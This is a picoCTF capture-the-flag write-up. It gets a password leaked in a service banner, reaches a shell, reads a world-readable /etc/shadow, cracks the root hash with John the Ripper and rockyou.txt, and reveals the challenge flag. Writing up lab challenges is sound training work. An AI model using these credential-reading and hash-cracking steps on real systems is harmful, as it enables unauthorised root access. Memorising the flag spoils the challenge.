# dont-you-love-banners

## General

### Can you abuse the banner? The server has been leaking some crucial information on tethys.picoctf.net 56016. Use the leaked information to get to the server.  To connect to the running application, use nc tethys.picoctf.net 62001. From the above information abuse the machine and find the flag in the /root directory.

Based on the text, we need to go to port 56016 first.  It doesn't prompt to use `nc`, but when I'm given a host and port, it's my go-to.

```sh
$ nc tethys.picoctf.net 56016
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234

```

Excellent, the password is right there. Off to the other endpoint.

```sh
$ nc tethys.picoctf.net 62001
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
```
Wait! You didn't say there would be a quiz! :rage:

```sh
What is the top cyber security conference in the world?
DefCon
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ 
```
W00t!  [John Draper](https://en.wikipedia.org/wiki/John_Draper) is also known as Captain Crunch.  Know your hacker history!  

Alright!  We have a prompt.

```sh
player@challenge:~$ whoami
whoami
player
player@challenge:~$ pwd
pwd
/home/player
player@challenge:~$ ls -la
ls -la
total 20
drwxr-xr-x 1 player player   20 Mar  9  2024 .
drwxr-xr-x 1 root   root     20 Mar  9  2024 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
-rw-r--r-- 1 player player  114 Feb  7  2024 banner
-rw-r--r-- 1 root   root     13 Feb  7  2024 text
player@challenge:~$ cat banner  
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat text
cat text
keep digging
player@challenge:~$ ls -l /root
ls -l /root
total 8
-rwx------ 1 root root   46 Mar 12  2024 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py
player@challenge:~$ cat /root/script.py
cat /root/script.py
```
```python
import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt
```

Nothing obvious there.  The next step is to start looking for misconfigurations.

There was no /etc/crontab, and no executable that's overly permissive.

```sh
$ crontab -e
crontab -e
-su: crontab: command not found

$ find / -type f -perm -04000 2>/dev/null
find / -type f -perm -04000 2>/dev/null
/bin/mount
/bin/su
/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign

```
Fingers crossed....

```sh
player@challenge:~$ ls -l /etc/shadow
ls -l /etc/shadow
-rw-r--r-- 1 root shadow 855 Mar  9  2024 /etc/shadow
player@challenge:~$ cat /etc/shadow
cat /etc/shadow
root:$6$6QFbdp2H$R0BGBJtG0DlGFx9H0AjuQNOhlcssBxApM.CjDEiNzfYkVeJRNy2d98SDURNebD5/l4Hu2yyVk.ePLNEg/56DV0:19791:0:99999:7:::
[REDACTED Entries Without Password Hash To Save Space]
player:$6$BCCW51fi$UI/5W01uG2.6EmxktMtZXbJQwrgDlv213cLwu7RxaIQHnRZXwKZ3yjuyNKf86KlSwbvAOp3YozpNVrBeKW9Ls0:19791:0:99999:7:::
```

Yes!  Note: /etc/shadow should never be readable by anyone but root!  The /etc/shadow file is where Linux stores the hashed password value.  That hash value for the root password follows 'root:'.  
Based on the '$6$', you can find that this is a SHA512 hash.  

A hash is a one-way algorithm.  In this case, it converts a plaintext password to something completely different (and hopefully unique).  Once the password is hashed, the system has no means of knowing what the password was.  When you log in and supply your password, the system hashes the value you submit and compares it with the value stored in the file.  If it matches, you gave the correct password.  This is good and bad.  The downside is that the value I input will always return the same hashed output.  The good part is that if you use a unique password, it's unlikely to be found in a list of leaked passwords. These lists are frequently used with password crackers like HashCat or John the Ripper.  For this exercise, we'll use the latter, but both have their pros and cons.  We'll use a password list called rockyou.txt.  This password list was created from a data breach of the company [RockYou](https://en.wikipedia.org/wiki/RockYou).  It contains over 14 million unique passwords pulled from that breach.

I copied the root line from /etc/shadow into a file called root_pw.txt

```sh
$ john -w=/usr/share/wordlists/rockyou.txt root_pw.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 10 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyou         (root)     
1g 0:00:00:00 DONE (2025-06-25 15:59) 7.692g/s 4923p/s 4923c/s 4923C/s 123456..pebbles
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

:joy: :joy:

Now to switch to the root user:

```sh
player@challenge:~$ su - root
su - root
Password: iloveyou

root@challenge:~# cat /root/flag
root@challenge:~# cat /root/flag.txt
cat /root/flag.txt
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}
```

**picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}**
